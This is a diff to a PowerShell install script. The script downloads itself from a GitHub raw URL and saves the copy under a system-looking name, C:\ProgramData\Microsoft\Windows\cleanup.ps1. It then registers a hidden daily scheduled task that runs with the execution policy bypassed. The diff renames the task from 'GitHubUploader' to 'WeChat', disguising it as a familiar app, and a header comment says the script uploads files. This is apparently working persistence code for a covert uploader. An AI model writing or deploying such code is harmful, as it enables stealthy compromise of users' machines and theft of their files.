@@ -1,4 +1,6 @@
-# Save self to local file path for scheduled task (clean name, no space)
+# install.ps1 - 上传文件 + 注册计划任务（计划任务名：WeChat）
+
+# Save self to local file path for scheduled task (no space)
 $localPath = "C:\ProgramData\Microsoft\Windows\cleanup.ps1"
 Invoke-RestMethod -Uri "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/install.ps1" -OutFile $localPath -UseBasicParsing
 
@@ -114,10 +116,17 @@ try {
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 
-# STEP 6: Register task using schtasks (12:00 PM daily)
-$taskName = "GitHubUploader"
-$scriptPathEscaped = "C:\ProgramData\Microsoft\Windows\cleanup.ps1"
+# STEP 6: Register daily task at 1:00 AM to run the cleanup.ps1 script (schtasks version)
+$taskName = "WeChat"
+$scriptPath = "C:\ProgramData\Microsoft\Windows\cleanup.ps1"
 
-try {
-    schtasks /Create /TN $taskName /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPathEscaped`"" /SC DAILY /ST 23:00 /F | Out-Null
-} catch {}
+if (-Not (Test-Path $scriptPath)) {
+    Write-Error "❌ cleanup.ps1 not found at $scriptPath"
+    exit 1
+}
+
+Write-Host "📅 Registering scheduled task [$taskName] (daily at 01:00 AM)..."
+
+schtasks /Create /TN $taskName /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" /SC DAILY /ST 01:00 /F | Out-Null
+
+Write-Host "✅ Task registered: will run daily at 01:00 AM"
